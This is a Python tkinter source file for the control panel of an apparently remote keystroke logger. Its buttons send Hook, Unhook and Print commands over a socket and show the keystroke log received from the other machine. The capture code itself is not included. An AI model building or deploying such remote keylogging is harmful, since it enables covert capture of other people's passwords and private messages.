import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from tkinter.constants import INSERT

class KeyStroke(tk.Frame):
    def __init__(self, clientSocket, master=None):
        self.__client = clientSocket
        super().__init__(master)
        self.pack(fill="both", expand=True)
        self.createWidgets()

    def checkConnected(self):
        if self.__client == None:
            messagebox.showinfo("Error", "Connection errors",parent = self)
            return False
        else: return True
    
    def butHookClick(self):
        if not self.checkConnected():
           return
        s = "Hook"
        self.__client.send(s.encode('utf-8'))
        
    def butUnhookClick(self):
        if not self.checkConnected():
           return
        s = "Unhook"
        self.__client.send(s.encode('utf-8'))
    
    def butPrintClick(self):
        if not self.checkConnected():
           return
        s = "Print"
        self.__client.send(s.encode('utf-8'))
        buffer = self.__client.recv(4096).decode('utf-8')
        if not buffer or buffer=="No":
            return
        self.__client.send("Ok".encode("utf-8"))
        self.KeyLog = self.__client.recv(4096).decode("utf-8")

        self.KeyView.config(state="normal")
        self.KeyView.insert('end', self.KeyLog)
        self.KeyView.pack()
        self.KeyView.config(state="disabled")
        self.KeyLog = "" 

    def butDelClick(self):
        self.KeyLog = ""
        self.KeyView.config(state="normal")
        self.KeyView.delete('1.0','end')
        self.KeyView.pack()
        self.KeyView.config(state="disabled")

    def createWidgets(self):
        self.butHook = tk.Button(self, text = "Hook", relief="groove", bg="#d6d6d6")
        self.butHook["command"] = self.butHookClick
        self.butHook.place(x=10, y=10, height=50, width=60)

        self.butUnhook = tk.Button(self, text = "Unhook", relief="groove", bg="#d6d6d6")
        self.butUnhook["command"] = self.butUnhookClick
        self.butUnhook.place(x=80, y=10, height=50, width=60)

        self.butPrint = tk.Button(self, text = "Print", relief="groove", bg="#d6d6d6")
        self.butPrint["command"] = self.butPrintClick
        self.butPrint.place(x=150, y=10, height=50, width=60)
   
        self.butDel = tk.Button(self, text = "Delete", relief="groove", bg="#d6d6d6")
        self.butDel["command"] = self.butDelClick
        self.butDel.place(x=220, y=10, height=50, width=60)

        self.frame1 = tk.LabelFrame(self, text="")
        self.frame1.place(x=10, y=70, height=160, width=270)
        self.KeyView = tk.Text(self.frame1)
        self.KeyLog = ""
        self.KeyView.insert(INSERT, self.KeyLog)
        self.KeyView.config(state="disabled")
        self.KeyView.pack()
        end = None
